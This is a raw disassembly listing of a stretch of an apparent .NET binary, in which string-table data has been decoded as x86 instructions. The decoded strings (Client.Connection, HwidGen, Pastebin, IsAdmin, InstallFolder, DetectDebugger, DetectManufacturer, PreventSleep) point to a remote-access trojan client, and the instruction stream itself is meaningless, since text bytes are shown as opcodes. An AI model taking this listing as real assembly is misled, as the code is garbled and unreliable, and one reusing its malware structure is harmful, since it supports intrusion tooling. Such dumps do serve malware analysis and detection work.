  40875c:	00 57 72             	add    %dl,0x72(%edi)
  40875f:	69 74 65 4e 75 6c 6c 	imul   $0x6c6c75,0x4e(%ebp,%eiz,2),%esi
  408766:	00 
  408767:	53                   	push   %ebx
  408768:	65 74 41             	gs je  0x4087ac
  40876b:	73 4e                	jae    0x4087bb
  40876d:	75 6c                	jne    0x4087db
  40876f:	6c                   	insb   (%dx),%es:(%edi)
  408770:	00 4d 75             	add    %cl,0x75(%ebp)
  408773:	74 65                	je     0x4087da
  408775:	78 43                	js     0x4087ba
  408777:	6f                   	outsl  %ds:(%esi),(%dx)
  408778:	6e                   	outsb  %ds:(%esi),(%dx)
  408779:	74 72                	je     0x4087ed
  40877b:	6f                   	outsl  %ds:(%esi),(%dx)
  40877c:	6c                   	insb   (%dx),%es:(%edi)
  40877d:	00 45 6e             	add    %al,0x6e(%ebp)
  408780:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408783:	65 32 53 74          	xor    %gs:0x74(%ebx),%dl
  408787:	72 65                	jb     0x4087ee
  408789:	61                   	popa
  40878a:	6d                   	insl   (%dx),%es:(%edi)
  40878b:	00 46 69             	add    %al,0x69(%esi)
  40878e:	6c                   	insb   (%dx),%es:(%edi)
  40878f:	65 53                	gs push %ebx
  408791:	74 72                	je     0x408805
  408793:	65 61                	gs popa
  408795:	6d                   	insl   (%dx),%es:(%edi)
  408796:	00 4e 65             	add    %cl,0x65(%esi)
  408799:	74 77                	je     0x408812
  40879b:	6f                   	outsl  %ds:(%esi),(%dx)
  40879c:	72 6b                	jb     0x408809
  40879e:	53                   	push   %ebx
  40879f:	74 72                	je     0x408813
  4087a1:	65 61                	gs popa
  4087a3:	6d                   	insl   (%dx),%es:(%edi)
  4087a4:	00 53 73             	add    %dl,0x73(%ebx)
  4087a7:	6c                   	insb   (%dx),%es:(%edi)
  4087a8:	53                   	push   %ebx
  4087a9:	74 72                	je     0x40881d
  4087ab:	65 61                	gs popa
  4087ad:	6d                   	insl   (%dx),%es:(%edi)
  4087ae:	00 44 65 63          	add    %al,0x63(%ebp,%eiz,2)
  4087b2:	6f                   	outsl  %ds:(%esi),(%dx)
  4087b3:	64 65 46             	fs gs inc %esi
  4087b6:	72 6f                	jb     0x408827
  4087b8:	6d                   	insl   (%dx),%es:(%edi)
  4087b9:	53                   	push   %ebx
  4087ba:	74 72                	je     0x40882e
  4087bc:	65 61                	gs popa
  4087be:	6d                   	insl   (%dx),%es:(%edi)
  4087bf:	00 43 72             	add    %al,0x72(%ebx)
  4087c2:	79 70                	jns    0x408834
  4087c4:	74 6f                	je     0x408835
  4087c6:	53                   	push   %ebx
  4087c7:	74 72                	je     0x40883b
  4087c9:	65 61                	gs popa
  4087cb:	6d                   	insl   (%dx),%es:(%edi)
  4087cc:	00 47 5a             	add    %al,0x5a(%edi)
  4087cf:	69 70 53 74 72 65 61 	imul   $0x61657274,0x53(%eax),%esi
  4087d6:	6d                   	insl   (%dx),%es:(%edi)
  4087d7:	00 4d 65             	add    %cl,0x65(%ebp)
  4087da:	6d                   	insl   (%dx),%es:(%edi)
  4087db:	6f                   	outsl  %ds:(%esi),(%dx)
  4087dc:	72 79                	jb     0x408857
  4087de:	53                   	push   %ebx
  4087df:	74 72                	je     0x408853
  4087e1:	65 61                	gs popa
  4087e3:	6d                   	insl   (%dx),%es:(%edi)
  4087e4:	00 50 72             	add    %dl,0x72(%eax)
  4087e7:	6f                   	outsl  %ds:(%esi),(%dx)
  4087e8:	67 72 61             	addr16 jb 0x40884c
  4087eb:	6d                   	insl   (%dx),%es:(%edi)
  4087ec:	00 67 65             	add    %ah,0x65(%edi)
  4087ef:	74 5f                	je     0x408850
  4087f1:	49                   	dec    %ecx
  4087f2:	74 65                	je     0x408859
  4087f4:	6d                   	insl   (%dx),%es:(%edi)
  4087f5:	00 67 65             	add    %ah,0x65(%edi)
  4087f8:	74 5f                	je     0x408859
  4087fa:	49                   	dec    %ecx
  4087fb:	73 36                	jae    0x408833
  4087fd:	34 42                	xor    $0x42,%al
  4087ff:	69 74 4f 70 65 72 61 	imul   $0x74617265,0x70(%edi,%ecx,2),%esi
  408806:	74 
  408807:	69 6e 67 53 79 73 74 	imul   $0x74737953,0x67(%esi),%ebp
  40880e:	65 6d                	gs insl (%dx),%es:(%edi)
  408810:	00 43 6c             	add    %al,0x6c(%ebx)
  408813:	69 65 6e 74 2e 41 6c 	imul   $0x6c412e74,0x6e(%ebp),%esp
  40881a:	67 6f                	outsl  %ds:(%si),(%dx)
  40881c:	72 69                	jb     0x408887
  40881e:	74 68                	je     0x408888
  408820:	6d                   	insl   (%dx),%es:(%edi)
  408821:	00 53 79             	add    %dl,0x79(%ebx)
  408824:	6d                   	insl   (%dx),%es:(%edi)
  408825:	6d                   	insl   (%dx),%es:(%edi)
  408826:	65 74 72             	gs je  0x40889b
  408829:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408830:	69 74 68 6d 00 41 73 	imul   $0x79734100,0x6d(%eax,%ebp,2),%esi
  408837:	79 
  408838:	6d                   	insl   (%dx),%es:(%edi)
  408839:	6d                   	insl   (%dx),%es:(%edi)
  40883a:	65 74 72             	gs je  0x4088af
  40883d:	69 63 41 6c 67 6f 72 	imul   $0x726f676c,0x41(%ebx),%esp
  408844:	69 74 68 6d 00 48 61 	imul   $0x73614800,0x6d(%eax,%ebp,2),%esi
  40884b:	73 
  40884c:	68 41 6c 67 6f       	push   $0x6f676c41
  408851:	72 69                	jb     0x4088bc
  408853:	74 68                	je     0x4088bd
  408855:	6d                   	insl   (%dx),%es:(%edi)
  408856:	00 54 72 69          	add    %dl,0x69(%edx,%esi,2)
  40885a:	6d                   	insl   (%dx),%es:(%edi)
  40885b:	00 52 61             	add    %dl,0x61(%edx)
  40885e:	6e                   	outsb  %ds:(%esi),(%dx)
  40885f:	64 6f                	outsl  %fs:(%esi),(%dx)
  408861:	6d                   	insl   (%dx),%es:(%edi)
  408862:	00 49 43             	add    %cl,0x43(%ecx)
  408865:	72 79                	jb     0x4088e0
  408867:	70 74                	jo     0x4088dd
  408869:	6f                   	outsl  %ds:(%esi),(%dx)
  40886a:	54                   	push   %esp
  40886b:	72 61                	jb     0x4088ce
  40886d:	6e                   	outsb  %ds:(%esi),(%dx)
  40886e:	73 66                	jae    0x4088d6
  408870:	6f                   	outsl  %ds:(%esi),(%dx)
  408871:	72 6d                	jb     0x4088e0
  408873:	00 4d 73             	add    %cl,0x73(%ebp)
  408876:	67 50                	addr16 push %eax
  408878:	61                   	popa
  408879:	63 6b 45             	arpl   %ebp,0x45(%ebx)
  40887c:	6e                   	outsb  %ds:(%esi),(%dx)
  40887d:	75 6d                	jne    0x4088ec
  40887f:	00 57 72             	add    %dl,0x72(%edi)
  408882:	69 74 65 42 6f 6f 6c 	imul   $0x656c6f6f,0x42(%ebp,%eiz,2),%esi
  408889:	65 
  40888a:	61                   	popa
  40888b:	6e                   	outsb  %ds:(%esi),(%dx)
  40888c:	00 54 6f 42          	add    %dl,0x42(%edi,%ebp,2)
  408890:	6f                   	outsl  %ds:(%esi),(%dx)
  408891:	6f                   	outsl  %ds:(%esi),(%dx)
  408892:	6c                   	insb   (%dx),%es:(%edi)
  408893:	65 61                	gs popa
  408895:	6e                   	outsb  %ds:(%esi),(%dx)
  408896:	00 53 65             	add    %dl,0x65(%ebx)
  408899:	74 41                	je     0x4088dc
  40889b:	73 42                	jae    0x4088df
  40889d:	6f                   	outsl  %ds:(%esi),(%dx)
  40889e:	6f                   	outsl  %ds:(%esi),(%dx)
  40889f:	6c                   	insb   (%dx),%es:(%edi)
  4088a0:	65 61                	gs popa
  4088a2:	6e                   	outsb  %ds:(%esi),(%dx)
  4088a3:	00 48 77             	add    %cl,0x77(%eax)
  4088a6:	69 64 47 65 6e 00 6c 	imul   $0x656c006e,0x65(%edi,%eax,2),%esp
  4088ad:	65 
  4088ae:	6e                   	outsb  %ds:(%esi),(%dx)
  4088af:	00 63 68             	add    %ah,0x68(%ebx)
  4088b2:	69 6c 64 72 65 6e 00 	imul   $0x4d006e65,0x72(%esp,%eiz,2),%ebp
  4088b9:	4d 
  4088ba:	61                   	popa
  4088bb:	69 6e 00 58 35 30 39 	imul   $0x39303558,0x0(%esi),%ebp
  4088c2:	43                   	inc    %ebx
  4088c3:	68 61 69 6e 00       	push   $0x6e6961
  4088c8:	63 68 61             	arpl   %ebp,0x61(%eax)
  4088cb:	69 6e 00 41 70 70 44 	imul   $0x44707041,0x0(%esi),%ebp
  4088d2:	6f                   	outsl  %ds:(%esi),(%dx)
  4088d3:	6d                   	insl   (%dx),%es:(%edi)
  4088d4:	61                   	popa
  4088d5:	69 6e 00 67 65 74 5f 	imul   $0x5f746567,0x0(%esi),%ebp
  4088dc:	43                   	inc    %ebx
  4088dd:	75 72                	jne    0x408951
  4088df:	72 65                	jb     0x408946
  4088e1:	6e                   	outsb  %ds:(%esi),(%dx)
  4088e2:	74 44                	je     0x408928
  4088e4:	6f                   	outsl  %ds:(%esi),(%dx)
  4088e5:	6d                   	insl   (%dx),%es:(%edi)
  4088e6:	61                   	popa
  4088e7:	69 6e 00 50 61 73 74 	imul   $0x74736150,0x0(%esi),%ebp
  4088ee:	65 62 69 6e          	bound  %ebp,%gs:0x6e(%ecx)
  4088f2:	00 49 73             	add    %cl,0x73(%ecx)
  4088f5:	41                   	inc    %ecx
  4088f6:	64 6d                	fs insl (%dx),%es:(%edi)
  4088f8:	69 6e 00 4a 6f 69 6e 	imul   $0x6e696f4a,0x0(%esi),%ebp
  4088ff:	00 47 65             	add    %al,0x65(%edi)
  408902:	74 46                	je     0x40894a
  408904:	69 6c 65 4e 61 6d 65 	imul   $0x57656d61,0x4e(%ebp,%eiz,2),%ebp
  40890b:	57 
  40890c:	69 74 68 6f 75 74 45 	imul   $0x78457475,0x6f(%eax,%ebp,2),%esi
  408913:	78 
  408914:	74 65                	je     0x40897b
  408916:	6e                   	outsb  %ds:(%esi),(%dx)
  408917:	73 69                	jae    0x408982
  408919:	6f                   	outsl  %ds:(%esi),(%dx)
  40891a:	6e                   	outsb  %ds:(%esi),(%dx)
  40891b:	00 67 65             	add    %ah,0x65(%edi)
  40891e:	74 5f                	je     0x40897f
  408920:	4f                   	dec    %edi
  408921:	53                   	push   %ebx
  408922:	56                   	push   %esi
  408923:	65 72 73             	gs jb  0x408999
  408926:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40892d:	74 65                	je     0x408994
  40892f:	6d                   	insl   (%dx),%es:(%edi)
  408930:	2e 49                	cs dec %ecx
  408932:	4f                   	dec    %edi
  408933:	2e 43                	cs inc %ebx
  408935:	6f                   	outsl  %ds:(%esi),(%dx)
  408936:	6d                   	insl   (%dx),%es:(%edi)
  408937:	70 72                	jo     0x4089ab
  408939:	65 73 73             	gs jae 0x4089af
  40893c:	69 6f 6e 00 41 70 70 	imul   $0x70704100,0x6e(%edi),%ebp
  408943:	6c                   	insb   (%dx),%es:(%edi)
  408944:	69 63 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%ebx),%esp
  40894b:	00 53 79             	add    %dl,0x79(%ebx)
  40894e:	73 74                	jae    0x4089c4
  408950:	65 6d                	gs insl (%dx),%es:(%edi)
  408952:	2e 53                	cs push %ebx
  408954:	65 63 75 72          	arpl   %esi,%gs:0x72(%ebp)
  408958:	69 74 79 2e 41 75 74 	imul   $0x68747541,0x2e(%ecx,%edi,2),%esi
  40895f:	68 
  408960:	65 6e                	outsb  %gs:(%esi),(%dx)
  408962:	74 69                	je     0x4089cd
  408964:	63 61 74             	arpl   %esp,0x74(%ecx)
  408967:	69 6f 6e 00 53 79 73 	imul   $0x73795300,0x6e(%edi),%ebp
  40896e:	74 65                	je     0x4089d5
  408970:	6d                   	insl   (%dx),%es:(%edi)
  408971:	2e 52                	cs push %edx
  408973:	65 66 6c             	gs data16 insb (%dx),%es:(%edi)
  408976:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  40897b:	6e                   	outsb  %ds:(%esi),(%dx)
  40897c:	00 58 35             	add    %bl,0x35(%eax)
  40897f:	30 39                	xor    %bh,(%ecx)
  408981:	43                   	inc    %ebx
  408982:	65 72 74             	gs jb  0x4089f9
  408985:	69 66 69 63 61 74 65 	imul   $0x65746163,0x69(%esi),%esp
  40898c:	43                   	inc    %ebx
  40898d:	6f                   	outsl  %ds:(%esi),(%dx)
  40898e:	6c                   	insb   (%dx),%es:(%edi)
  40898f:	6c                   	insb   (%dx),%es:(%edi)
  408990:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  408995:	6e                   	outsb  %ds:(%esi),(%dx)
  408996:	00 4d 61             	add    %cl,0x61(%ebp)
  408999:	6e                   	outsb  %ds:(%esi),(%dx)
  40899a:	61                   	popa
  40899b:	67 65 6d             	gs insl (%dx),%es:(%di)
  40899e:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089a0:	74 4f                	je     0x4089f1
  4089a2:	62 6a 65             	bound  %ebp,0x65(%edx)
  4089a5:	63 74 43 6f          	arpl   %esi,0x6f(%ebx,%eax,2)
  4089a9:	6c                   	insb   (%dx),%es:(%edi)
  4089aa:	6c                   	insb   (%dx),%es:(%edi)
  4089ab:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089b0:	6e                   	outsb  %ds:(%esi),(%dx)
  4089b1:	00 43 6c             	add    %al,0x6c(%ebx)
  4089b4:	69 65 6e 74 2e 43 6f 	imul   $0x6f432e74,0x6e(%ebp),%esp
  4089bb:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bc:	6e                   	outsb  %ds:(%esi),(%dx)
  4089bd:	65 63 74 69 6f       	arpl   %esi,%gs:0x6f(%ecx,%ebp,2)
  4089c2:	6e                   	outsb  %ds:(%esi),(%dx)
  4089c3:	00 73 65             	add    %dh,0x65(%ebx)
  4089c6:	74 5f                	je     0x408a27
  4089c8:	50                   	push   %eax
  4089c9:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ca:	73 69                	jae    0x408a35
  4089cc:	74 69                	je     0x408a37
  4089ce:	6f                   	outsl  %ds:(%esi),(%dx)
  4089cf:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d0:	00 70 6f             	add    %dh,0x6f(%eax)
  4089d3:	73 69                	jae    0x408a3e
  4089d5:	74 69                	je     0x408a40
  4089d7:	6f                   	outsl  %ds:(%esi),(%dx)
  4089d8:	6e                   	outsb  %ds:(%esi),(%dx)
  4089d9:	00 43 72             	add    %al,0x72(%ebx)
  4089dc:	79 70                	jns    0x408a4e
  4089de:	74 6f                	je     0x408a4f
  4089e0:	67 72 61             	addr16 jb 0x408a44
  4089e3:	70 68                	jo     0x408a4d
  4089e5:	69 63 45 78 63 65 70 	imul   $0x70656378,0x45(%ebx),%esp
  4089ec:	74 69                	je     0x408a57
  4089ee:	6f                   	outsl  %ds:(%esi),(%dx)
  4089ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4089f0:	00 41 72             	add    %al,0x72(%ecx)
  4089f3:	67 75 6d             	addr16 jne 0x408a63
  4089f6:	65 6e                	outsb  %gs:(%esi),(%dx)
  4089f8:	74 4e                	je     0x408a48
  4089fa:	75 6c                	jne    0x408a68
  4089fc:	6c                   	insb   (%dx),%es:(%edi)
  4089fd:	45                   	inc    %ebp
  4089fe:	78 63                	js     0x408a63
  408a00:	65 70 74             	gs jo  0x408a77
  408a03:	69 6f 6e 00 41 72 67 	imul   $0x67724100,0x6e(%edi),%ebp
  408a0a:	75 6d                	jne    0x408a79
  408a0c:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a0e:	74 45                	je     0x408a55
  408a10:	78 63                	js     0x408a75
  408a12:	65 70 74             	gs jo  0x408a89
  408a15:	69 6f 6e 00 55 6e 6b 	imul   $0x6b6e5500,0x6e(%edi),%ebp
  408a1c:	6e                   	outsb  %ds:(%esi),(%dx)
  408a1d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a1e:	77 6e                	ja     0x408a8e
  408a20:	00 49 6d             	add    %cl,0x6d(%ecx)
  408a23:	61                   	popa
  408a24:	67 65 43             	addr16 gs inc %ebx
  408a27:	6f                   	outsl  %ds:(%esi),(%dx)
  408a28:	64 65 63 49 6e       	fs arpl %ecx,%gs:0x6e(%ecx)
  408a2d:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a2f:	00 53 65             	add    %dl,0x65(%ebx)
  408a32:	6e                   	outsb  %ds:(%esi),(%dx)
  408a33:	64 49                	fs dec %ecx
  408a35:	6e                   	outsb  %ds:(%esi),(%dx)
  408a36:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a38:	00 46 69             	add    %al,0x69(%esi)
  408a3b:	6c                   	insb   (%dx),%es:(%edi)
  408a3c:	65 49                	gs dec %ecx
  408a3e:	6e                   	outsb  %ds:(%esi),(%dx)
  408a3f:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a41:	00 44 72 69          	add    %al,0x69(%edx,%esi,2)
  408a45:	76 65                	jbe    0x408aac
  408a47:	49                   	dec    %ecx
  408a48:	6e                   	outsb  %ds:(%esi),(%dx)
  408a49:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a4b:	00 46 69             	add    %al,0x69(%esi)
  408a4e:	6c                   	insb   (%dx),%es:(%edi)
  408a4f:	65 53                	gs push %ebx
  408a51:	79 73                	jns    0x408ac6
  408a53:	74 65                	je     0x408aba
  408a55:	6d                   	insl   (%dx),%es:(%edi)
  408a56:	49                   	dec    %ecx
  408a57:	6e                   	outsb  %ds:(%esi),(%dx)
  408a58:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a5a:	00 43 6f             	add    %al,0x6f(%ebx)
  408a5d:	6d                   	insl   (%dx),%es:(%edi)
  408a5e:	70 75                	jo     0x408ad5
  408a60:	74 65                	je     0x408ac7
  408a62:	72 49                	jb     0x408aad
  408a64:	6e                   	outsb  %ds:(%esi),(%dx)
  408a65:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a67:	00 43 53             	add    %al,0x53(%ebx)
  408a6a:	68 61 72 70 41       	push   $0x41707261
  408a6f:	72 67                	jb     0x408ad8
  408a71:	75 6d                	jne    0x408ae0
  408a73:	65 6e                	outsb  %gs:(%esi),(%dx)
  408a75:	74 49                	je     0x408ac0
  408a77:	6e                   	outsb  %ds:(%esi),(%dx)
  408a78:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a7a:	00 50 72             	add    %dl,0x72(%eax)
  408a7d:	6f                   	outsl  %ds:(%esi),(%dx)
  408a7e:	63 65 73             	arpl   %esp,0x73(%ebp)
  408a81:	73 53                	jae    0x408ad6
  408a83:	74 61                	je     0x408ae6
  408a85:	72 74                	jb     0x408afb
  408a87:	49                   	dec    %ecx
  408a88:	6e                   	outsb  %ds:(%esi),(%dx)
  408a89:	66 6f                	outsw  %ds:(%esi),(%dx)
  408a8b:	00 57 72             	add    %dl,0x72(%edi)
  408a8e:	69 74 65 4d 61 70 00 	imul   $0x50007061,0x4d(%ebp,%eiz,2),%esi
  408a95:	50 
  408a96:	72 65                	jb     0x408afd
  408a98:	76 65                	jbe    0x408aff
  408a9a:	6e                   	outsb  %ds:(%esi),(%dx)
  408a9b:	74 53                	je     0x408af0
  408a9d:	6c                   	insb   (%dx),%es:(%edi)
  408a9e:	65 65 70 00          	gs gs jo 0x408aa2
  408aa2:	5a                   	pop    %edx
  408aa3:	69 70 00 63 75 72 72 	imul   $0x72727563,0x0(%eax),%esi
  408aaa:	65 6e                	outsb  %gs:(%esi),(%dx)
  408aac:	74 41                	je     0x408aef
  408aae:	70 70                	jo     0x408b20
  408ab0:	00 4d 69             	add    %cl,0x69(%ebp)
  408ab3:	63 72 6f             	arpl   %esi,0x6f(%edx)
  408ab6:	73 6f                	jae    0x408b27
  408ab8:	66 74 2e             	data16 je 0x408ae9
  408abb:	43                   	inc    %ebx
  408abc:	53                   	push   %ebx
  408abd:	68 61 72 70 00       	push   $0x707261
  408ac2:	47                   	inc    %edi
  408ac3:	72 6f                	jb     0x408b34
  408ac5:	75 70                	jne    0x408b37
  408ac7:	00 4e 6f             	add    %cl,0x6f(%esi)
  408aca:	72 6d                	jb     0x408b39
  408acc:	61                   	popa
  408acd:	6c                   	insb   (%dx),%es:(%edi)
  408ace:	53                   	push   %ebx
  408acf:	74 61                	je     0x408b32
  408ad1:	72 74                	jb     0x408b47
  408ad3:	75 70                	jne    0x408b45
  408ad5:	00 53 79             	add    %dl,0x79(%ebx)
  408ad8:	73 74                	jae    0x408b4e
  408ada:	65 6d                	gs insl (%dx),%es:(%edi)
  408adc:	2e 4c                	cs dec %esp
  408ade:	69 6e 71 00 43 6c 65 	imul   $0x656c4300,0x71(%esi),%ebp
  408ae5:	61                   	popa
  408ae6:	72 00                	jb     0x408ae8
  408ae8:	43                   	inc    %ebx
  408ae9:	68 61 72 00 49       	push   $0x49007261
  408aee:	6e                   	outsb  %ds:(%esi),(%dx)
  408aef:	76 6f                	jbe    0x408b60
  408af1:	6b 65 4d 65          	imul   $0x65,0x4d(%ebp),%esp
  408af5:	6d                   	insl   (%dx),%es:(%edi)
  408af6:	62 65 72             	bound  %esp,0x72(%ebp)
  408af9:	00 4d 44             	add    %cl,0x44(%ebp)
  408afc:	35 43 72 79 70       	xor    $0x70797243,%eax
  408b01:	74 6f                	je     0x408b72
  408b03:	53                   	push   %ebx
  408b04:	65 72 76             	gs jb  0x408b7d
  408b07:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b0e:	69 64 65 72 00 52 53 	imul   $0x41535200,0x72(%ebp,%eiz,2),%esp
  408b15:	41 
  408b16:	43                   	inc    %ebx
  408b17:	72 79                	jb     0x408b92
  408b19:	70 74                	jo     0x408b8f
  408b1b:	6f                   	outsl  %ds:(%esi),(%dx)
  408b1c:	53                   	push   %ebx
  408b1d:	65 72 76             	gs jb  0x408b96
  408b20:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b27:	69 64 65 72 00 41 65 	imul   $0x73654100,0x72(%ebp,%eiz,2),%esp
  408b2e:	73 
  408b2f:	43                   	inc    %ebx
  408b30:	72 79                	jb     0x408bab
  408b32:	70 74                	jo     0x408ba8
  408b34:	6f                   	outsl  %ds:(%esi),(%dx)
  408b35:	53                   	push   %ebx
  408b36:	65 72 76             	gs jb  0x408baf
  408b39:	69 63 65 50 72 6f 76 	imul   $0x766f7250,0x65(%ebx),%esp
  408b40:	69 64 65 72 00 53 74 	imul   $0x72745300,0x72(%ebp,%eiz,2),%esp
  408b47:	72 
  408b48:	69 6e 67 42 75 69 6c 	imul   $0x6c697542,0x67(%esi),%ebp
  408b4f:	64 65 72 00          	fs gs jb 0x408b53
  408b53:	49                   	dec    %ecx
  408b54:	6e                   	outsb  %ds:(%esi),(%dx)
  408b55:	73 74                	jae    0x408bcb
  408b57:	61                   	popa
  408b58:	6c                   	insb   (%dx),%es:(%edi)
  408b59:	6c                   	insb   (%dx),%es:(%edi)
  408b5a:	46                   	inc    %esi
  408b5b:	6f                   	outsl  %ds:(%esi),(%dx)
  408b5c:	6c                   	insb   (%dx),%es:(%edi)
  408b5d:	64 65 72 00          	fs gs jb 0x408b61
  408b61:	49                   	dec    %ecx
  408b62:	64 53                	fs push %ebx
  408b64:	65 6e                	outsb  %gs:(%esi),(%dx)
  408b66:	64 65 72 00          	fs gs jb 0x408b6a
  408b6a:	73 65                	jae    0x408bd1
  408b6c:	6e                   	outsb  %ds:(%esi),(%dx)
  408b6d:	64 65 72 00          	fs gs jb 0x408b71
  408b71:	4d                   	dec    %ebp
  408b72:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  408b79:	74 2e                	je     0x408ba9
  408b7b:	43                   	inc    %ebx
  408b7c:	53                   	push   %ebx
  408b7d:	68 61 72 70 2e       	push   $0x2e707261
  408b82:	52                   	push   %edx
  408b83:	75 6e                	jne    0x408bf3
  408b85:	74 69                	je     0x408bf0
  408b87:	6d                   	insl   (%dx),%es:(%edi)
  408b88:	65 42                	gs inc %edx
  408b8a:	69 6e 64 65 72 00 43 	imul   $0x43007265,0x64(%esi),%ebp
  408b91:	61                   	popa
  408b92:	6c                   	insb   (%dx),%es:(%edi)
  408b93:	6c                   	insb   (%dx),%es:(%edi)
  408b94:	53                   	push   %ebx
  408b95:	69 74 65 42 69 6e 64 	imul   $0x65646e69,0x42(%ebp,%eiz,2),%esi
  408b9c:	65 
  408b9d:	72 00                	jb     0x408b9f
  408b9f:	47                   	inc    %edi
  408ba0:	65 74 45             	gs je  0x408be8
  408ba3:	6e                   	outsb  %ds:(%esi),(%dx)
  408ba4:	63 6f 64             	arpl   %ebp,0x64(%edi)
  408ba7:	65 72 00             	gs jb  0x408baa
  408baa:	67 65 74 5f          	addr16 gs je 0x408c0d
  408bae:	42                   	inc    %edx
  408baf:	75 66                	jne    0x408c17
  408bb1:	66 65 72 00          	data16 gs jb 0x408bb5
  408bb5:	73 65                	jae    0x408c1c
  408bb7:	74 5f                	je     0x408c18
  408bb9:	42                   	inc    %edx
  408bba:	75 66                	jne    0x408c22
  408bbc:	66 65 72 00          	data16 gs jb 0x408bc0
  408bc0:	57                   	push   %edi
  408bc1:	72 69                	jb     0x408c2c
  408bc3:	74 65                	je     0x408c2a
  408bc5:	49                   	dec    %ecx
  408bc6:	6e                   	outsb  %ds:(%esi),(%dx)
  408bc7:	74 65                	je     0x408c2e
  408bc9:	67 65 72 00          	addr16 gs jb 0x408bcd
  408bcd:	67 65 74 5f          	addr16 gs je 0x408c30
  408bd1:	41                   	inc    %ecx
  408bd2:	73 49                	jae    0x408c1d
  408bd4:	6e                   	outsb  %ds:(%esi),(%dx)
  408bd5:	74 65                	je     0x408c3c
  408bd7:	67 65 72 00          	addr16 gs jb 0x408bdb
  408bdb:	73 65                	jae    0x408c42
  408bdd:	74 5f                	je     0x408c3e
  408bdf:	41                   	inc    %ecx
  408be0:	73 49                	jae    0x408c2b
  408be2:	6e                   	outsb  %ds:(%esi),(%dx)
  408be3:	74 65                	je     0x408c4a
  408be5:	67 65 72 00          	addr16 gs jb 0x408be9
  408be9:	47                   	inc    %edi
  408bea:	65 74 41             	gs je  0x408c2e
  408bed:	73 49                	jae    0x408c38
  408bef:	6e                   	outsb  %ds:(%esi),(%dx)
  408bf0:	74 65                	je     0x408c57
  408bf2:	67 65 72 00          	addr16 gs jb 0x408bf6
  408bf6:	53                   	push   %ebx
  408bf7:	65 74 41             	gs je  0x408c3b
  408bfa:	73 49                	jae    0x408c45
  408bfc:	6e                   	outsb  %ds:(%esi),(%dx)
  408bfd:	74 65                	je     0x408c64
  408bff:	67 65 72 00          	addr16 gs jb 0x408c03
  408c03:	44                   	inc    %esp
  408c04:	65 74 65             	gs je  0x408c6c
  408c07:	63 74 44 65          	arpl   %esi,0x65(%esp,%eax,2)
  408c0b:	62 75 67             	bound  %esi,0x67(%ebp)
  408c0e:	67 65 72 00          	addr16 gs jb 0x408c12
  408c12:	4d                   	dec    %ebp
  408c13:	61                   	popa
  408c14:	6e                   	outsb  %ds:(%esi),(%dx)
  408c15:	61                   	popa
  408c16:	67 65 6d             	gs insl (%dx),%es:(%di)
  408c19:	65 6e                	outsb  %gs:(%esi),(%dx)
  408c1b:	74 4f                	je     0x408c6c
  408c1d:	62 6a 65             	bound  %ebp,0x65(%edx)
  408c20:	63 74 53 65          	arpl   %esi,0x65(%ebx,%edx,2)
  408c24:	61                   	popa
  408c25:	72 63                	jb     0x408c8a
  408c27:	68 65 72 00 53       	push   $0x53007265
  408c2c:	65 73 73             	gs jae 0x408ca2
  408c2f:	69 6f 6e 45 6e 64 69 	imul   $0x69646e45,0x6e(%edi),%ebp
  408c36:	6e                   	outsb  %ds:(%esi),(%dx)
  408c37:	67 45                	addr16 inc %ebp
  408c39:	76 65                	jbe    0x408ca0
  408c3b:	6e                   	outsb  %ds:(%esi),(%dx)
  408c3c:	74 48                	je     0x408c86
  408c3e:	61                   	popa
  408c3f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c40:	64 6c                	fs insb (%dx),%es:(%edi)
  408c42:	65 72 00             	gs jb  0x408c45
  408c45:	54                   	push   %esp
  408c46:	69 6d 65 72 00 6f 77 	imul   $0x776f0072,0x65(%ebp),%ebp
  408c4d:	6e                   	outsb  %ds:(%esi),(%dx)
  408c4e:	65 72 00             	gs jb  0x408c51
  408c51:	43                   	inc    %ebx
  408c52:	6c                   	insb   (%dx),%es:(%edi)
  408c53:	69 65 6e 74 2e 48 65 	imul   $0x65482e74,0x6e(%ebp),%esp
  408c5a:	6c                   	insb   (%dx),%es:(%edi)
  408c5b:	70 65                	jo     0x408cc2
  408c5d:	72 00                	jb     0x408c5f
  408c5f:	54                   	push   %esp
  408c60:	6f                   	outsl  %ds:(%esi),(%dx)
  408c61:	55                   	push   %ebp
  408c62:	70 70                	jo     0x408cd4
  408c64:	65 72 00             	gs jb  0x408c67
  408c67:	44                   	inc    %esp
  408c68:	65 74 65             	gs je  0x408cd0
  408c6b:	63 74 4d 61          	arpl   %esi,0x61(%ebp,%ecx,2)
  408c6f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c70:	75 66                	jne    0x408cd8
  408c72:	61                   	popa
  408c73:	63 74 75 72          	arpl   %esi,0x72(%ebp,%esi,2)
  408c77:	65 72 00             	gs jb  0x408c7a
  408c7a:	43                   	inc    %ebx
  408c7b:	75 72                	jne    0x408cef
  408c7d:	72 65                	jb     0x408ce4
  408c7f:	6e                   	outsb  %ds:(%esi),(%dx)
  408c80:	74 55                	je     0x408cd7
  408c82:	73 65                	jae    0x408ce9
  408c84:	72 00                	jb     0x408c86
